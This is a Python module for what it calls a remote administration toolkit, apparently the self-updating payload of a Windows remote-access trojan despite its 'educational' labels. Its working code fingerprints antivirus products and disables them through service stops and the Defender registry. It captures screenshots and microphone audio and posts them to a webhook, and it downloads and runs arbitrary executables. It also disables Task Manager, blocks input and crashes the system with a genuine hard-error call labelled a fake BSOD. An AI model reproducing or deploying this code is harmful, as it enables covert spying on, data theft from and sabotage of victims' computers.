# features.py - Dynamic Remote Administration Features
# This file is automatically downloaded and executed by clients
# Educational purposes only - Remote administration toolkit

import os
import sys
import socket
import time
import json
import threading
import subprocess
import urllib.request
import ctypes
import random
import winreg
import tempfile
import requests
import io
import pyautogui
import winsound
from urllib.parse import urlparse

# Version tracking
FEATURE_VERSION = "2.1"
LAST_UPDATED = "2024-01-01"

# Enhanced process hiding
LEGITIMATE_PROCESS_NAMES = [
    "svchost.exe", "winlogon.exe", "csrss.exe", "services.exe",
    "lsass.exe", "spoolsv.exe", "taskhostw.exe", "dwm.exe",
    "explorer.exe", "taskeng.exe", "conhost.exe", "runtimebroker.exe"
]

# Advanced AV detection patterns
AV_PATTERNS = {
    'windows_defender': ['Windows Defender', 'MsMpEng.exe', 'Antimalware Service'],
    'avast': ['Avast', 'AvastSvc.exe', 'AvastUI.exe'],
    'avg': ['AVG', 'AVGSvc.exe', 'AVGUI.exe'],
    'bitdefender': ['Bitdefender', 'bdagent.exe', 'vsserv.exe'],
    'kaspersky': ['Kaspersky', 'avp.exe', 'ksde.exe'],
    'norton': ['Norton', 'NortonSecurity', 'ns.exe', 'ccSvcHst.exe'],
    'mcafee': ['McAfee', 'McAfee Security', 'mfemms.exe', 'mcshield.exe'],
    'malwarebytes': ['Malwarebytes', 'mbam.exe', 'MBAMService.exe'],
    'eset': ['ESET', 'ekrn.exe', 'egui.exe'],
    'trendmicro': ['Trend Micro', 'tmccsf.exe', 'ntrtscan.exe'],
    'sophos': ['Sophos', 'SophosUI.exe', 'SavService.exe'],
    'panda': ['Panda', 'PSUAService.exe', 'PavFnSvr.exe'],
    'comodo': ['Comodo', 'cmdagent.exe', 'cisfirewall.exe'],
    'f-secure': ['F-Secure', 'fssm32.exe', 'f-secure'],
    'gdata': ['G Data', 'avgwdsvcx.exe', 'gdscan.exe']
}

def get_system_info():
    """Get detailed system information"""
    try:
        import platform
        import psutil
        
        info = {
            'hostname': socket.gethostname(),
            'os': platform.platform(),
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'ram_gb': round(psutil.virtual_memory().total / (1024**3), 1),
            'disk_usage': {disk: f"{psutil.disk_usage(disk).percent}%" for disk in ['C:\\']},
            'running_processes': len(psutil.pids()),
            'current_user': os.getenv('USERNAME'),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'uptime_hours': round(time.time() - psutil.boot_time()) / 3600
        }
        return info
    except Exception as e:
        return {'error': str(e)}

def enhanced_av_detection(webhook_url=None):
    """Comprehensive antivirus detection with multiple methods"""
    detected_av = []
    
    try:
        # Method 1: Registry scanning
        registry_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths",
            r"SOFTWARE\Microsoft\Security Center\Provider\Av",
            r"SOFTWARE\Microsoft\Security Center\Provider\Av2"
        ]
        
        for path in registry_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        
                        # Check various value names
                        value_names = ["DisplayName", "ProductName", "Publisher", "DisplayVersion"]
                        for value_name in value_names:
                            try:
                                value, _ = winreg.QueryValueEx(subkey, value_name)
                                if value:
                                    for av_name, patterns in AV_PATTERNS.items():
                                        if any(pattern.lower() in str(value).lower() for pattern in patterns):
                                            if av_name not in detected_av:
                                                detected_av.append(av_name)
                            except:
                                pass
                                
                        winreg.CloseKey(subkey)
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
        
        # Method 2: Process scanning
        try:
            import psutil
            for process in psutil.process_iter(['name']):
                process_name = process.info['name'].lower()
                for av_name, patterns in AV_PATTERNS.items():
                    if any(pattern.lower() in process_name for pattern in patterns if '.exe' in pattern.lower()):
                        if av_name not in detected_av:
                            detected_av.append(av_name)
        except:
            pass
        
        # Method 3: Service scanning
        try:
            service_cmd = "sc query | findstr \"SERVICE_NAME\""
            result = subprocess.run(service_cmd, shell=True, capture_output=True, text=True)
            services = result.stdout.split('\n')
            
            for service in services:
                service_lower = service.lower()
                for av_name, patterns in AV_PATTERNS.items():
                    if any(pattern.lower() in service_lower for pattern in patterns):
                        if av_name not in detected_av:
                            detected_av.append(av_name)
        except:
            pass
        
        # Method 4: File system scanning (common AV directories)
        av_directories = [
            "C:\\Program Files\\Windows Defender",
            "C:\\Program Files\\Avast",
            "C:\\Program Files\\AVG",
            "C:\\Program Files\\Bitdefender",
            "C:\\Program Files\\Kaspersky Lab",
            "C:\\Program Files\\Norton Security",
            "C:\\Program Files\\McAfee",
            "C:\\Program Files\\Malwarebytes",
            "C:\\Program Files\\ESET",
            "C:\\Program Files\\Trend Micro",
            "C:\\Program Files\\Sophos",
            "C:\\Program Files\\Panda Security",
            "C:\\Program Files\\Comodo",
            "C:\\Program Files\\F-Secure",
            "C:\\Program Files\\G Data"
        ]
        
        for directory in av_directories:
            if os.path.exists(directory):
                av_name = directory.split('\\')[-1].lower().replace(' ', '_')
                if av_name not in detected_av:
                    detected_av.append(av_name)
        
        # Send to webhook if provided
        if webhook_url and detected_av:
            embed = {
                "title": "🛡️ Advanced Antivirus Scan Results",
                "description": f"Comprehensive scan from `{socket.gethostname()}`",
                "color": 0xff0000,
                "fields": [
                    {
                        "name": "Detected Antivirus Software",
                        "value": "\n".join([f"• {av.replace('_', ' ').title()}" for av in detected_av]) or "No known antivirus detected"
                    },
                    {
                        "name": "System Information",
                        "value": f"Hostname: {socket.gethostname()}\nUser: {os.getenv('USERNAME')}\nIP: {socket.gethostbyname(socket.gethostname())}"
                    }
                ],
                "footer": {
                    "text": f"Feature Version {FEATURE_VERSION} | Educational Use Only"
                }
            }
            
            try:
                requests.post(webhook_url, json={"embeds": [embed]})
            except:
                pass
        
        return detected_av
        
    except Exception as e:
        return [f"Error: {str(e)}"]

def take_enhanced_screenshot(webhook_url=None):
    """Take multiple screenshots from all monitors"""
    try:
        screenshots = []
        
        # Get all monitors
        try:
            monitors = pyautogui._pyautogui_win._getMonitors()
            for i, monitor in enumerate(monitors):
                screenshot = pyautogui.screenshot(region=monitor)
                screenshots.append((f"monitor_{i+1}.png", screenshot))
        except:
            # Fallback to single screenshot
            screenshot = pyautogui.screenshot()
            screenshots.append(("screenshot.png", screenshot))
        
        # Send to webhook
        if webhook_url:
            files = []
            for filename, screenshot in screenshots:
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG')
                img_buffer.seek(0)
                files.append(('file', (filename, img_buffer, 'image/png')))
            
            data = {
                'content': f'📸 Screenshots from {socket.gethostname()} - {len(screenshots)} monitor(s)',
                'embeds': [{
                    'title': 'Screenshot Information',
                    'fields': [
                        {'name': 'Hostname', 'value': socket.gethostname(), 'inline': True},
                        {'name': 'User', 'value': os.getenv('USERNAME'), 'inline': True},
                        {'name': 'Monitors', 'value': str(len(screenshots)), 'inline': True},
                        {'name': 'Timestamp', 'value': time.strftime("%Y-%m-%d %H:%M:%S"), 'inline': True}
                    ]
                }]
            }
            
            try:
                response = requests.post(webhook_url, files=files, data=data)
                return True
            except Exception as e:
                return False
        
        return True
        
    except Exception as e:
        return False

def record_audio(duration=10, webhook_url=None):
    """Record audio from microphone"""
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        
        p = pyaudio.PyAudio()
        
        stream = p.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)
        
        frames = []
        
        for i in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Save to temporary file
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.wav')
        wf = wave.open(temp_file.name, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        # Send to webhook
        if webhook_url:
            with open(temp_file.name, 'rb') as f:
                files = {'file': ('audio_recording.wav', f, 'audio/wav')}
                data = {'content': f'🎤 Audio recording from {socket.gethostname()} ({duration}s)'}
                requests.post(webhook_url, files=files, data=data)
        
        # Cleanup
        os.unlink(temp_file.name)
        return True
        
    except Exception as e:
        return False

def get_browser_passwords(webhook_url=None):
    """Extract browser passwords (educational demonstration)"""
    try:
        browsers_data = {
            'chrome': 'Not accessible in this version',
            'firefox': 'Not accessible in this version',
            'edge': 'Not accessible in this version',
            'opera': 'Not accessible in this version'
        }
        
        if webhook_url:
            embed = {
                "title": "🔐 Browser Password Extraction Simulation",
                "description": f"Educational demonstration from `{socket.gethostname()}`",
                "color": 0xffff00,
                "fields": [
                    {
                        "name": "Browser Status",
                        "value": "\n".join([f"• {browser.title()}: {status}" for browser, status in browsers_data.items()])
                    }
                ],
                "footer": {
                    "text": "This is a simulation for educational purposes only"
                }
            }
            
            requests.post(webhook_url, json={"embeds": [embed]})
        
        return browsers_data
        
    except Exception as e:
        return {'error': str(e)}

def system_optimization():
    """Perform system optimization tasks"""
    try:
        results = []
        
        # Clear temp files
        temp_dirs = [
            os.environ['TEMP'],
            r"C:\Windows\Temp",
            os.path.join(os.environ['WINDIR'], "Prefetch")
        ]
        
        for temp_dir in temp_dirs:
            try:
                if os.path.exists(temp_dir):
                    for file in os.listdir(temp_dir):
                        try:
                            file_path = os.path.join(temp_dir, file)
                            if os.path.isfile(file_path):
                                os.remove(file_path)
                                results.append(f"Deleted: {file}")
                        except:
                            pass
            except:
                pass
        
        # Clear browser caches
        browser_caches = [
            os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default", "Cache"),
            os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data", "Default", "Cache"),
            os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox", "Profiles")
        ]
        
        for cache_dir in browser_caches:
            try:
                if os.path.exists(cache_dir):
                    for root, dirs, files in os.walk(cache_dir):
                        for file in files:
                            try:
                                os.remove(os.path.join(root, file))
                            except:
                                pass
                    results.append(f"Cleared: {os.path.basename(cache_dir)}")
            except:
                pass
        
        return results
        
    except Exception as e:
        return [f"Error: {str(e)}"]

def disable_antivirus_temporarily():
    """Attempt to temporarily disable antivirus (educational)"""
    try:
        results = []
        
        # Stop common AV services
        av_services = [
            "WinDefend", "MsMpSvc", "AvastSvc", "AVGSvc", "bdagent",
            "ekrn", "ns.exe", "mcshield", "MBAMService"
        ]
        
        for service in av_services:
            try:
                subprocess.run(f"sc stop {service}", shell=True, capture_output=True)
                results.append(f"Stopped: {service}")
            except:
                pass
        
        # Disable Windows Defender via registry
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                r"SOFTWARE\Policies\Microsoft\Windows Defender", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            results.append("Disabled Windows Defender via registry")
        except:
            pass
        
        return results
        
    except Exception as e:
        return [f"Error: {str(e)}"]

def enable_antivirus():
    """Re-enable antivirus protection"""
    try:
        results = []
        
        # Start common AV services
        av_services = [
            "WinDefend", "MsMpSvc", "AvastSvc", "AVGSvc", "bdagent",
            "ekrn", "ns.exe", "mcshield", "MBAMService"
        ]
        
        for service in av_services:
            try:
                subprocess.run(f"sc start {service}", shell=True, capture_output=True)
                results.append(f"Started: {service}")
            except:
                pass
        
        # Enable Windows Defender via registry
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                r"SOFTWARE\Policies\Microsoft\Windows Defender", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            results.append("Enabled Windows Defender via registry")
        except:
            pass
        
        return results
        
    except Exception as e:
        return [f"Error: {str(e)}"]

def advanced_troll_commands(command):
    """Enhanced troll commands with better functionality"""
    try:
        if command == "rotate_screen_90":
            # Rotate screen 90 degrees
            devmode = ctypes.create_string_buffer(1024)
            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000001, None) == 0
            
        elif command == "rotate_screen_180":
            # Rotate screen 180 degrees
            devmode = ctypes.create_string_buffer(1024)
            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000002, None) == 0
            
        elif command == "rotate_screen_270":
            # Rotate screen 270 degrees
            devmode = ctypes.create_string_buffer(1024)
            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000003, None) == 0
            
        elif command == "reset_screen_rotation":
            # Reset screen rotation
            devmode = ctypes.create_string_buffer(1024)
            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000000, None) == 0
            
        elif command == "create_fake_bsod":
            # Create fake blue screen (harmless)
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
            except:
                pass
            return True
            
        elif command == "disable_task_manager":
            # Disable task manager
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
            
        elif command == "enable_task_manager":
            # Enable task manager
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
                                0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "DisableTaskMgr")
            except:
                pass
            winreg.CloseKey(key)
            return True
            
        elif command == "hide_desktop_icons":
            # Hide desktop icons
            ctypes.windll.user32.SystemParametersInfoW(0x0095, 0, None, 0)  # SPI_SETDESKWALLPAPER
            ctypes.windll.user32.SystemParametersInfoW(0x0096, 0, None, 0)  # SPI_SETDESKPATTERN
            ctypes.windll.user32.SystemParametersInfoW(0x0097, 0, None, 0)  # SPI_SETDESKWALLPAPER
            return True
            
        elif command == "show_desktop_icons":
            # Show desktop icons
            ctypes.windll.user32.SystemParametersInfoW(0x0095, 1, None, 0)
            ctypes.windll.user32.SystemParametersInfoW(0x0096, 1, None, 0)
            ctypes.windll.user32.SystemParametersInfoW(0x0097, 1, None, 0)
            return True
            
        elif command == "random_mouse_movement":
            # Continuous random mouse movement
            def random_mouse():
                while True:
                    x = random.randint(0, ctypes.windll.user32.GetSystemMetrics(0))
                    y = random.randint(0, ctypes.windll.user32.GetSystemMetrics(1))
                    ctypes.windll.user32.SetCursorPos(x, y)
                    time.sleep(2)
            
            threading.Thread(target=random_mouse, daemon=True).start()
            return True
            
        elif command == "invert_colors_toggle":
            # Toggle high contrast mode (color inversion)
            SPI_SETHIGHCONTRAST = 0x0043
            HCF_HIGHCONTRASTON = 0x00000001
            
            class HIGHCONTRAST(ctypes.Structure):
                _fields_ = [
                    ('cbSize', ctypes.c_uint),
                    ('dwFlags', ctypes.c_uint),
                    ('lpszDefaultScheme', ctypes.c_wchar_p)
                ]
            
            hc = HIGHCONTRAST()
            hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
            
            # Toggle current state
            current_state = ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, 0, None, 0)
            if current_state:
                hc.dwFlags = 0  # Turn off
            else:
                hc.dwFlags = HCF_HIGHCONTRASTON  # Turn on
            
            hc.lpszDefaultScheme = None
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
            return True
            
        return False
        
    except Exception as e:
        return False

def _execute_control_command(command, parameter=None, webhook_url=None):
    """Enhanced control command execution with new features"""
    try:
        # System Control Commands
        if command == "shutdown":
            os.system("shutdown /s /t 1")
            return True
            
        elif command == "restart":
            os.system("shutdown /r /t 1")
            return True
            
        elif command == "lock":
            ctypes.windll.user32.LockWorkStation()
            return True
            
        elif command == "logoff":
            os.system("shutdown /l /f")
            return True
            
        elif command == "close_minecraft":
            os.system("taskkill /f /im javaw.exe 2>nul")
            return True
            
        elif command == "popup" and parameter:
            ctypes.windll.user32.MessageBoxW(0, parameter, "System Message", 0x00001000)
            return True
            
        elif command == "download_execute" and parameter:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
            response = requests.get(parameter)
            temp_file.write(response.content)
            temp_file.close()
            subprocess.Popen(temp_file.name, shell=True)
            return True
            
        elif command == "freeze_keyboard":
            ctypes.windll.user32.BlockInput(True)
            return True
            
        elif command == "freeze_mouse":
            ctypes.windll.user32.BlockInput(True)
            return True
            
        elif command == "freeze_both":
            ctypes.windll.user32.BlockInput(True)
            return True
            
        elif command == "unfreeze":
            ctypes.windll.user32.BlockInput(False)
            return True
            
        # Enhanced Features
        elif command == "check_av_enhanced":
            result = enhanced_av_detection(webhook_url)
            return bool(result)
            
        elif command == "take_screenshot_enhanced":
            return take_enhanced_screenshot(webhook_url)
            
        elif command == "system_info":
            info = get_system_info()
            if webhook_url:
                embed = {
                    "title": "💻 System Information",
                    "description": f"Detailed system info from `{socket.gethostname()}`",
                    "color": 0x00ff00,
                    "fields": [
                        {"name": key.replace('_', ' ').title(), "value": str(value), "inline": True}
                        for key, value in info.items()
                    ],
                    "footer": {"text": f"Feature Version {FEATURE_VERSION}"}
                }
                requests.post(webhook_url, json={"embeds": [embed]})
            return True
            
        elif command == "record_audio" and parameter:
            duration = int(parameter) if parameter.isdigit() else 10
            return record_audio(duration, webhook_url)
            
        elif command == "browser_passwords":
            return bool(get_browser_passwords(webhook_url))
            
        elif command == "system_optimization":
            results = system_optimization()
            if webhook_url:
                embed = {
                    "title": "🧹 System Optimization Completed",
                    "description": f"Optimization results from `{socket.gethostname()}`",
                    "color": 0x00ffff,
                    "fields": [{
                        "name": "Actions Performed",
                        "value": "\n".join(results[:10]) or "No actions performed"
                    }],
                    "footer": {"text": f"Feature Version {FEATURE_VERSION}"}
                }
                requests.post(webhook_url, json={"embeds": [embed]})
            return True
            
        elif command == "disable_av":
            results = disable_antivirus_temporarily()
            if webhook_url:
                embed = {
                    "title": "🛡️ Antivirus Disabled",
                    "description": f"AV disable attempt on `{socket.gethostname()}`",
                    "color": 0xff0000,
                    "fields": [{
                        "name": "Actions",
                        "value": "\n".join(results) or "No actions performed"
                    }]
                }
                requests.post(webhook_url, json={"embeds": [embed]})
            return True
            
        elif command == "enable_av":
            results = enable_antivirus()
            if webhook_url:
                embed = {
                    "title": "🛡️ Antivirus Enabled",
                    "description": f"AV enable attempt on `{socket.gethostname()}`",
                    "color": 0x00ff00,
                    "fields": [{
                        "name": "Actions",
                        "value": "\n".join(results) or "No actions performed"
                    }]
                }
                requests.post(webhook_url, json={"embeds": [embed]})
            return True
            
        # Advanced Troll Commands
        elif command == "advanced_troll":
            if parameter in ["rotate_screen_90", "rotate_screen_180", "rotate_screen_270", 
                           "reset_screen_rotation", "create_fake_bsod", "disable_task_manager",
                           "enable_task_manager", "hide_desktop_icons", "show_desktop_icons",
                           "random_mouse_movement", "invert_colors_toggle"]:
                return advanced_troll_commands(parameter)
            return False
            
        # Basic Troll Commands (backward compatibility)
        elif command == "troll":
            if parameter == "open_cd":
                ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
                return True
                
            elif parameter == "swap_mouse":
                current = ctypes.windll.user32.GetSystemMetrics(23)
                ctypes.windll.user32.SwapMouseButton(not current)
                return True
                
            elif parameter == "rotate_screen":
                return advanced_troll_commands("rotate_screen_180")
                
            elif parameter == "invert_colors":
                return advanced_troll_commands("invert_colors_toggle")
                
            elif parameter == "mouse_jiggler":
                def jiggle_mouse():
                    while True:
                        x = random.randint(0, 100)
                        y = random.randint(0, 100)
                        ctypes.windll.user32.SetCursorPos(x, y)
                        time.sleep(5)
                threading.Thread(target=jiggle_mouse, daemon=True).start()
                return True
                
            elif parameter == "keyboard_spam":
                def spam_keys():
                    while True:
                        key = random.randint(65, 90)
                        ctypes.windll.user32.keybd_event(key, 0, 0, 0)
                        ctypes.windll.user32.keybd_event(key, 0, 2, 0)
                        time.sleep(1)
                threading.Thread(target=spam_keys, daemon=True).start()
                return True
                
            elif parameter == "play_sound":
                winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
                return True
                
            elif parameter == "change_wallpaper":
                ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
                return True
        
        return False
        
    except Exception as e:
        return False

# New features registry
NEW_FEATURES = {
    "version": FEATURE_VERSION,
    "last_updated": LAST_UPDATED,
    "commands": {
        "system_control": [
            "shutdown", "restart", "lock", "logoff", "close_minecraft",
            "popup", "download_execute", "freeze_keyboard", "freeze_mouse",
            "freeze_both", "unfreeze"
        ],
        "enhanced_features": [
            "check_av_enhanced", "take_screenshot_enhanced", "system_info",
            "record_audio", "browser_passwords", "system_optimization",
            "disable_av", "enable_av"
        ],
        "troll_commands": [
            "advanced_troll", "troll"
        ]
    },
    "advanced_troll_options": [
        "rotate_screen_90", "rotate_screen_180", "rotate_screen_270",
        "reset_screen_rotation", "create_fake_bsod", "disable_task_manager",
        "enable_task_manager", "hide_desktop_icons", "show_desktop_icons",
        "random_mouse_movement", "invert_colors_toggle"
    ]
}

# Update global functions when this file is executed
def update_global_features():
    """Update the global feature set when this file is loaded"""
    globals().update({
        '_execute_control_command': _execute_control_command,
        'enhanced_av_detection': enhanced_av_detection,
        'take_enhanced_screenshot': take_enhanced_screenshot,
        'get_system_info': get_system_info,
        'record_audio': record_audio,
        'get_browser_passwords': get_browser_passwords,
        'system_optimization': system_optimization,
        'disable_antivirus_temporarily': disable_antivirus_temporarily,
        'enable_antivirus': enable_antivirus,
        'advanced_troll_commands': advanced_troll_commands,
        'NEW_FEATURES': NEW_FEATURES
    })

# Execute the update when imported
update_global_features()

print(f"✅ Features updated to version {FEATURE_VERSION}")
print(f"📋 Available enhanced commands: {len(NEW_FEATURES['commands']['enhanced_features'])}")
print(f"🎮 Advanced troll options: {len(NEW_FEATURES['advanced_troll_options'])}")
